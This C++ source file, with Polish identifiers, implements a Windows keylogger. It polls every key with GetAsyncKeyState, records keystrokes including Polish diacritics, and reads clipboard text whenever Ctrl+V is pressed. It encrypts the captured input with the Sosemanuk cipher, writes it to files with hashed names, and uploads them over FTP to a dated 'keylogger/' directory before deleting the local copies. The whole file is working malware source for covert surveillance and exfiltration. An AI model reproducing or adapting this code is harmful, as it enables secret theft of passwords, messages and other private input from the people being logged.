#include "Keylogger.h"
#include "Sosemanuk.h"
#include <Windows.h>


Keylogger::Keylogger(string sciezka_docelowego,string klucz, string IV, int dlugosc_strumienia_klucza, int rozmiar_paczki_bajy, FTP *ftp, int start_numer_paczki)
{
	this->nazwa_pliku_docelowego = "tekst.txt";
	this->sciezka_docelowego = sciezka_docelowego;
	this->sosemanuk = new Sosemanuk(klucz, IV, dlugosc_strumienia_klucza);
	this->rozmiar_paczki_bajy = rozmiar_paczki_bajy;
	this->numer_paczki = start_numer_paczki;

	this->klucz = klucz;
	this->IV = IV;
	this->dlugosc_strumienia_klucza = dlugosc_strumienia_klucza;

	this->blake = new Blake();
	this->ftp = ftp;

}


Keylogger::~Keylogger()
{
}

int Keylogger::zapis_do_pliku(unsigned char znak)
{
	if ((znak == 1) || (znak == 2)) return 0;

	switch (znak)
	{	
		case VK_BACK     : this->sosemanuk->encryption("[BACKSPACE]"); break;
		case VK_TAB      : this->sosemanuk->encryption("[TAB]"); break;
		case VK_RETURN   : this->sosemanuk->encryption("\n"); break;
		//case VK_SHIFT    : this->sosemanuk->encryption(  "[SHIFT]"); break;
		//case VK_CONTROL  : this->sosemanuk->encryption( "[CONTROL]"); break;
		//case VK_MENU     : this->sosemanuk->encryption(  "[ALT]"); break;
		case VK_CAPITAL  : this->sosemanuk->encryption("[CAPSLOCK]"); break;
		case VK_ESCAPE   : this->sosemanuk->encryption("[ESCAPE]"); break;
		case VK_SPACE	 : this->sosemanuk->encryption(" "); break;
		case VK_PRIOR	 : this->sosemanuk->encryption("[PAGE UP]"); break;
		case VK_NEXT	 : this->sosemanuk->encryption("[PAGE DOWN]"); break;
		case VK_END		 : this->sosemanuk->encryption("[END]"); break;
		case VK_HOME     : this->sosemanuk->encryption("[HOME]"); break;
		case VK_LEFT     : this->sosemanuk->encryption("[LEFT]"); break;
		case VK_UP       : this->sosemanuk->encryption("[UP]"); break;
		case VK_RIGHT    : this->sosemanuk->encryption("[RIGHT]"); break;
		case VK_DOWN     : this->sosemanuk->encryption("[DOWN]"); break;
		case VK_SNAPSHOT : this->sosemanuk->encryption("[PRINT SCREEN]"); break;
		case VK_INSERT   : this->sosemanuk->encryption("[INSERT]"); break;
		case VK_DELETE   : this->sosemanuk->encryption("[DELETE]"); break;
			
		case 48: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? ")" : "0")); break;
		case 49: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "!" : "1")); break;
		case 50: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "@" : "2")); break;
		case 51: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "#" : "3")); break;
		case 52: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "$" : "4")); break;
		case 53: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "%" : "5")); break;
		case 54: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "^" : "6")); break;
		case 55: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "&" : "7")); break;
		case 56: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "*" : "8")); break;
		case 57: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "(" : "9")); break;
		
		case 65: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_RMENU) < 0 ? "¥": (GetKeyState(VK_CONTROL) < 0 ? "[ZAZNACZ WSZYSTKO]" : "A")) : (GetKeyState(VK_RMENU) < 0 ? "¹" : (GetKeyState(VK_CONTROL) < 0 ? "[ZAZNACZ WSZYSTKO]" : "a")))); break;
		case 66: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "B" : "b")); break;
		case 67: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_RMENU) < 0 ? "Æ" : (GetKeyState(VK_CONTROL) < 0 ? "[KOPIUJ]" : "C")) : (GetKeyState(VK_RMENU) < 0 ? "æ" : (GetKeyState(VK_CONTROL) < 0 ? "[KOPIUJ]" : "c")))); break;
		case 68: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "D" : "d")); break;
		case 69: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_RMENU) < 0 ? "Ê" : "E") : (GetKeyState(VK_RMENU) < 0 ? "ê" : "e"))); break;
		case 70: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_CONTROL) < 0 ? "[SZUKAJ]" : "F") : (GetKeyState(VK_CONTROL) < 0 ? "[SZUKAJ]" : "f"))); break;
		case 71: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "G" : "g")); break;
		case 72: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "H" : "h")); break;
		case 73: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "I" : "i")); break;
		case 74: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "J" : "j")); break;
		case 75: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "K" : "k")); break;
		case 76: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_RMENU) < 0 ? "£" : "L") : (GetKeyState(VK_RMENU) < 0 ? "³" : "l"))); break;
		case 77: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "M" : "m")); break;
		case 78: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_RMENU) < 0 ? "Ñ" : "N") : (GetKeyState(VK_RMENU) < 0 ? "ñ" : "n"))); break;
		case 79: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_RMENU) < 0 ? "Ó" : "O") : (GetKeyState(VK_RMENU) < 0 ? "ó" : "o"))); break;
		case 80: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "P" : "p")); break;
		case 81: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "Q" : "q")); break;
		case 82: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "R" : "r")); break;
		case 83: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_RMENU) < 0 ? "Œ" : (GetKeyState(VK_CONTROL) < 0 ? "[ZAPISZ]" : "S")) : (GetKeyState(VK_RMENU) < 0 ? "œ" : (GetKeyState(VK_CONTROL) < 0 ? "[ZAPISZ]" : "s")))); break;
		case 84: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "T" : "t")); break;
		case 85: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "U" : "u")); break;
		case 86: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_CONTROL) < 0 ? this->odczyt_ze_schowka() : "V") : (GetKeyState(VK_CONTROL) < 0 ? this->odczyt_ze_schowka() : "v"))); break;
		case 87: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "W" : "w")); break;
		case 88: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_RMENU) < 0 ? "" : "X") : (GetKeyState(VK_RMENU) < 0 ? "Ÿ" : (GetKeyState(VK_CONTROL) < 0 ? "[WYTNIJ]" : "x")))); break;
		case 89: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? "Y" : "y")); break;
		case 90: this->sosemanuk->encryption((((GetKeyState(VK_SHIFT) < 0) ^ GetKeyState(VK_CAPITAL)) ? (GetKeyState(VK_RMENU) < 0 ? "¯" : (GetKeyState(VK_CONTROL) < 0 ? "[COFNIJ]" : "Z")) : (GetKeyState(VK_RMENU) < 0 ? "¿" : (GetKeyState(VK_CONTROL) < 0 ? "[COFNIJ]" : "z")))); break;

		case VK_RWIN     : this->sosemanuk->encryption("[RIGHT WINDOWS]"); break;
		case VK_LWIN     : this->sosemanuk->encryption("[LEFT WINDOWS]"); break;
		case VK_APPS     : this->sosemanuk->encryption("[APPS]"); break;
		case VK_NUMPAD0  : this->sosemanuk->encryption("0"); break;
		case VK_NUMPAD1  : this->sosemanuk->encryption("1"); break;
		case VK_NUMPAD2  : this->sosemanuk->encryption("2"); break;
		case VK_NUMPAD3  : this->sosemanuk->encryption("3"); break;
		case VK_NUMPAD4  : this->sosemanuk->encryption("4"); break;
		case VK_NUMPAD5  : this->sosemanuk->encryption("5"); break;
		case VK_NUMPAD6  : this->sosemanuk->encryption("6"); break;
		case VK_NUMPAD7  : this->sosemanuk->encryption("7"); break;
		case VK_NUMPAD8  : this->sosemanuk->encryption("8"); break;
		case VK_NUMPAD9  : this->sosemanuk->encryption("9"); break;
		case VK_MULTIPLY : this->sosemanuk->encryption("*"); break;
		case VK_ADD      : this->sosemanuk->encryption("+"); break;
			
		case VK_SUBTRACT : this->sosemanuk->encryption("-"); break;
		case VK_DECIMAL  : this->sosemanuk->encryption(","); break;
		case VK_DIVIDE   : this->sosemanuk->encryption("/"); break;
	
		case VK_F1 : this->sosemanuk->encryption("[F1]"); break;
		case VK_F2 : this->sosemanuk->encryption("[F2]"); break;
		case VK_F3 : this->sosemanuk->encryption("[F3]"); break;
		case VK_F4 : this->sosemanuk->encryption("[F4]"); break;
		case VK_F5 : this->sosemanuk->encryption("[F5]"); break;
		case VK_F6 : this->sosemanuk->encryption("[F6]"); break;
		case VK_F7 : this->sosemanuk->encryption("[F7]"); break;
		case VK_F8 : this->sosemanuk->encryption("[F8]"); break;
		case VK_F9 : this->sosemanuk->encryption("[F9]"); break;
		case VK_F10: this->sosemanuk->encryption("[F10]"); break;
		case VK_F11: this->sosemanuk->encryption("[F11]"); break;
		case VK_F12: this->sosemanuk->encryption("[F12]"); break;

		case VK_NUMLOCK : this->sosemanuk->encryption("[NUM LOCKA]"); break;
		case VK_SCROLL  : this->sosemanuk->encryption("[SCROLL LOCK]"); break;

		//case VK_LSHIFT   : this->sosemanuk->encryption("[LEFT SHIFT]"); break;
		//case VK_RSHIFT   : this->sosemanuk->encryption("[RIGHT SHIFT]"); break;
		//case VK_LCONTROL : this->sosemanuk->encryption("[LEFT CONTROL]"); break;
		//case VK_RCONTROL : this->sosemanuk->encryption("[RIGHT CONTROL]"); break;
		//case VK_LMENU    : this->sosemanuk->encryption("[LEFT ALT]"); break;
		//case VK_RMENU    : this->sosemanuk->encryption("[RIGHT ALT]"); break;

		case 186: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? ":" : ";")); break;
		case 187: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "+" : "=")); break;
		case 188: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "<" : ",")); break;
		case 189: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "_" : "-")); break;
		case 190: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "<" : ".")); break;
		case 191: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "?" : "/")); break;
		case 192: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "~" : "`")); break;

		case 219: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "{" : "[")); break;
		case 220: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "|" : "\\")); break;
		case 221: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "}" : "]")); break;
		case 222: this->sosemanuk->encryption(((GetKeyState(VK_SHIFT) < 0) ? "\"" : "'")); break;
			
		//default: this->sosemanuk->encryption((unsigned char)key_stroke); break;
	}
	
	if (this->sosemanuk->getSzyfrogram().length() == this->rozmiar_paczki_bajy)
	{
		this->wyslij_paczke();
		return 1;
	}

	return 0;
}

void Keylogger::wyslij_paczke()
{
	this->nazwa_pliku_docelowego = this->get_nowa_nazwa_pliku_docelowego(this->nazwa_pliku_docelowego);

	fstream plik;
	string nazwa_pliku = this->sciezka_docelowego + this->nazwa_pliku_docelowego + "_" + to_string(this->numer_paczki++);

	plik.open(nazwa_pliku, ios::app);
	plik << flush;

	if (plik.good() == true) 
	{
		plik << this->sosemanuk->getSzyfrogram();
		
		delete (this->sosemanuk);

		// nowy klucz //
		this->klucz = get_nowy_klucz();

		// ju¿ nie trzeba tworzyæ bo po pierwszej paczce wychodzi
		//this->sosemanuk = new Sosemanuk(this->klucz, this->IV, this->dlugosc_strumienia_klucza);
	}
	else
	{
		cout << "BLAD ODCZYTU PLIKU  " << nazwa_pliku << endl;
	}

	plik.close();

	if (this->ftp->Connetion())
	{
		time_t now = time(0);
		tm *ltm = localtime(&now);
		string data = to_string(1900 + ltm->tm_year) + "-" + to_string(1 + ltm->tm_mon) + "-" + to_string(ltm->tm_mday);
		string path_dir = "keylogger/" + data + "/";

		this->ftp->CreateDir(path_dir);

		{
			string nazwa_plik_ftp = path_dir + to_string(this->numer_paczki - 1);

			if (this->ftp->Send(nazwa_pliku.c_str(), nazwa_plik_ftp.c_str()))
			{
				remove(nazwa_pliku.c_str());
			}
		}

		//cout << "KONIEC" << endl;
		//this->ftp->Disconnetion();
	}
}

string Keylogger::get_nowy_klucz() 
{
	string klucz = this->blake->Blake_256(this->klucz);
	return klucz.substr(0, 10);
}

string Keylogger::get_nowa_nazwa_pliku_docelowego(string nazwa_pliku_docelowego_temp) 
{
	return this->blake->Blake_256(nazwa_pliku_docelowego_temp);
}

string Keylogger::start()
{
	for(size_t j = 0; true; j++)
	{
		for (int i = 0; i < 256; i++) 
		{
			if (GetAsyncKeyState(i) == -32767) 
			{
				cout << i << endl;
				if (1 == this->zapis_do_pliku(i))
				{
					cout << this->klucz << endl;
					return this->klucz;
				}
			}
		}
	}
}


const char *Keylogger::odczyt_ze_schowka()
{
	HANDLE schowek = NULL;
	char * text = "";

	if (OpenClipboard(NULL)) 
	{

		schowek = GetClipboardData(CF_TEXT);

		if (schowek == NULL) 
		{
			return "";
		}

		text = static_cast<char*>(GlobalLock(schowek));

		if (text == NULL) 
		{
			return "";
		}

		GlobalUnlock(schowek);

		CloseClipboard();
	}

	return text;
}